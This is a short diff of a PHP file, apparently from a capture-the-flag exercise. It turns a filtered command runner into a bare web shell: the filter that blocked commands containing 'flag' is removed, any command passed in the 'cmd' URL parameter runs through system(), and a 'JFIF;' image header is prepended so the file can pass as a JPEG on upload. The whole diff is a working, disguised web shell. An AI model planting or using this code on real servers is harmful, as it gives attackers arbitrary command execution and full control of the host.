@@ -1,9 +1,8 @@
+JFIF;
 <?php
-if (isset($_GET['cmd'])) {
-    $cmd = $_GET['cmd'];
-    if (strpos($cmd, 'flag') !== false) {
-        die("No flags here!");
-    }
-    system($cmd);
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+} else {
+    echo "Usage: ?cmd=command";
 }
 ?>
